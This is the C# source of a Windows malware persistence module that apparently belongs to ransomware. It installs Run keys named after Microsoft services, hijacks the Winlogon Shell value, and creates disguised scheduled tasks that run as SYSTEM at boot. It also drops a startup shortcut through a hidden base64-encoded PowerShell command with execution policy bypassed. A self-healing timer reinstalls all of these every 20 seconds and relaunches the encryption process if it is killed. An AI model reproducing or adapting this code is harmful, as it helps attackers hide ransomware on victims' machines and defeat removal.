using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace ns0
{
    internal static class Persistence
    {
        private const string RunKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string ValueName = "WindowsSecurityService";
        private const string HklmRunKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string WinlogonKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
        private const string WinlogonShellValue = "Shell";
        private const string TaskName = "MicrosoftEdgeUpdateTaskMachineCore8F3A";
        private const string SecondaryTaskName = "WindowsSecurityHealthService";
        private const int HealIntervalMs = 20000;
        private const string StartupArg = "--startup";

        private static System.Threading.Timer _healTimer;
        private static readonly object _healLock = new object();
        private static bool _healing;
        private static string exePathCached;

        private static bool IsMainProcessAlive()
        {
            try
            {
                string exe = ExePath();
                exePathCached = exe;
                string name = Path.GetFileNameWithoutExtension(exe);
                int me = Process.GetCurrentProcess().Id;
                foreach (var p in Process.GetProcessesByName(name))
                {
                    try { if (p.Id != me) return true; }
                    catch { }
                }
            }
            catch { }
            return false;
        }

        private static string ExePath()
        {
            try { return Process.GetCurrentProcess().MainModule.FileName; }
            catch { return System.Reflection.Assembly.GetExecutingAssembly().Location; }
        }

        private static string QuotedExe()
        {
            return "\"" + ExePath() + "\"";
        }

        private static void InstallHkcuRun()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(RunKey, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null) return;
                    key.SetValue(ValueName, QuotedExe());
                    key.SetValue("MSEdgeAutoUpdate", QuotedExe());
                    key.SetValue("WindowsInstaller", QuotedExe() + " " + StartupArg);
                }
            }
            catch { }
        }

        private static void InstallHklmRun()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(HklmRunKey, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null) return;
                    key.SetValue(ValueName, QuotedExe());
                }
            }
            catch { }
        }

        private static void RunHidden(string file, string args)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = file,
                    Arguments = args,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (var p = Process.Start(psi))
                {
                    if (p != null) p.WaitForExit(8000);
                }
            }
            catch { }
        }

        private static void InstallWinlogon()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(WinlogonKey, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null) return;
                    object shell = key.GetValue(WinlogonShellValue);
                    string current = shell == null ? "explorer.exe" : shell.ToString();
                    if (current.IndexOf("explorer.exe", StringComparison.OrdinalIgnoreCase) >= 0 &&
                        current.IndexOf(ExePath(), StringComparison.OrdinalIgnoreCase) < 0)
                    {
                        key.SetValue(WinlogonShellValue, "explorer.exe, " + QuotedExe(), RegistryValueKind.String);
                    }
                }
            }
            catch { }
        }

        private static void InstallScheduledTask(string taskName)
        {
            RunHidden("schtasks.exe",
                string.Format("/Create /TN \"{0}\" /TR \"{1}\" /SC ONLOGON /RL HIGHEST /F", taskName, QuotedExe()));
        }

        private static void InstallStartupCopy()
        {
            try
            {
                string startup = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    "WindowsSecurity.lnk");
                if (File.Exists(startup)) return;

                string exe = ExePath();
                string script =
                    "$s=(New-Object -ComObject WScript.Shell).CreateShortcut('" + startup.Replace("'", "''") + "');" +
                    "$s.TargetPath='" + exe.Replace("'", "''") + "';$s.WindowStyle=7;$s.Save()";
                byte[] bytes = System.Text.Encoding.Unicode.GetBytes(script);
                string b64 = Convert.ToBase64String(bytes);
                RunHidden("powershell.exe",
                    "-NoProfile -ExecutionPolicy Bypass -EncodedCommand " + b64);
            }
            catch { }
        }

        public static void Install()
        {
            try
            {
                InstallHkcuRun();
                InstallHklmRun();
                InstallWinlogon();
                InstallStartupCopy();
                InstallScheduledTask(TaskName);
                InstallScheduledTask(SecondaryTaskName);
                InstallSafeModeTasks();
            }
            catch { }
        }

        // Устойчивость к Safe Mode: задачи уровня системы (запуск до логина).
        private static void InstallSafeModeTasks()
        {
            string[] bootTasks = new string[]
            {
                "Microsoft\\Windows\\WindowsUpdate\\AutomaticAppUpdate",
                "Microsoft\\Windows\\AppID\\PolicyConverter",
                "Microsoft\\Windows\\Explorer\\CleanupTemporaryState"
            };
            foreach (string t in bootTasks)
            {
                RunHidden("schtasks.exe",
                    string.Format("/Create /TN \"{0}\" /TR \"{1}\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F", t, QuotedExe()));
            }
        }

        private static void DeleteSafeModeTasks()
        {
            string[] bootTasks = new string[]
            {
                "Microsoft\\Windows\\WindowsUpdate\\AutomaticAppUpdate",
                "Microsoft\\Windows\\AppID\\PolicyConverter",
                "Microsoft\\Windows\\Explorer\\CleanupTemporaryState"
            };
            foreach (string t in bootTasks)
            {
                RunHidden("schtasks.exe", string.Format("/Delete /TN \"{0}\" /F", t));
            }
        }

        public static bool IsInstalled()
        {
            bool hkcu = false;
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(RunKey, false))
                {
                    hkcu = key?.GetValue(ValueName) != null;
                }
            }
            catch { }

            bool hklm = false;
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(HklmRunKey, false))
                {
                    hklm = key?.GetValue(ValueName) != null;
                }
            }
            catch { }

            bool task = false;
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = string.Format("/Query /TN \"{0}\"", TaskName),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using (var p = Process.Start(psi))
                {
                    if (p != null)
                    {
                        p.WaitForExit(8000);
                        task = p.ExitCode == 0;
                    }
                }
            }
            catch { }

            return hkcu || hklm || task;
        }

        public static void StartSelfHeal()
        {
            lock (_healLock)
            {
                if (_healTimer != null) return;
                _healTimer = new System.Threading.Timer(delegate(object state)
                {
                    try
                    {
                        if (_healing) return;
                        _healing = true;
                        Install();
                        ReassertWinlogon();

                        // Анти-тампер шифрования: если процесс шифрования должен идти,
                        // но ключевой процесс убит — поднимаем заново.
                        if (ShutdownTrigger.IsEncryptionActive() && !IsMainProcessAlive())
                        {
                            RunHidden(exePathCached ?? ExePath(), "");
                        }
                    }
                    catch { }
                    finally { _healing = false; }
                }, null, HealIntervalMs, HealIntervalMs);
            }
        }

        private static void ReassertWinlogon()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(WinlogonKey, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null) return;
                    object shell = key.GetValue(WinlogonShellValue);
                    string current = shell == null ? "" : shell.ToString();
                    if (current.IndexOf(ExePath(), StringComparison.OrdinalIgnoreCase) < 0 &&
                        current.IndexOf("explorer.exe", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        key.SetValue(WinlogonShellValue, "explorer.exe, " + QuotedExe(), RegistryValueKind.String);
                    }
                }
            }
            catch { }
        }

        public static void Uninstall()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(RunKey, true))
                {
                    if (key != null)
                    {
                        key.DeleteValue(ValueName, false);
                        key.DeleteValue("MSEdgeAutoUpdate", false);
                        key.DeleteValue("WindowsInstaller", false);
                    }
                }
            }
            catch { }

            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(HklmRunKey, true))
                {
                    if (key != null) key.DeleteValue(ValueName, false);
                }
            }
            catch { }

            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(WinlogonKey, true))
                {
                    if (key != null)
                    {
                        object shell = key.GetValue(WinlogonShellValue);
                        string current = shell == null ? "" : shell.ToString();
                        string cleaned = current.Replace(", " + QuotedExe(), "").Replace(QuotedExe(), "");
                        if (cleaned.Trim().Length == 0) cleaned = "explorer.exe";
                        key.SetValue(WinlogonShellValue, cleaned, RegistryValueKind.String);
                    }
                }
            }
            catch { }

            RunHidden("schtasks.exe", string.Format("/Delete /TN \"{0}\" /F", TaskName));
            RunHidden("schtasks.exe", string.Format("/Delete /TN \"{0}\" /F", SecondaryTaskName));
            DeleteSafeModeTasks();

            try
            {
                string startup = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    "WindowsSecurity.lnk");
                if (File.Exists(startup)) File.Delete(startup);
            }
            catch { }

            lock (_healLock)
            {
                if (_healTimer != null)
                {
                    _healTimer.Dispose();
                    _healTimer = null;
                }
            }
        }
    }
}
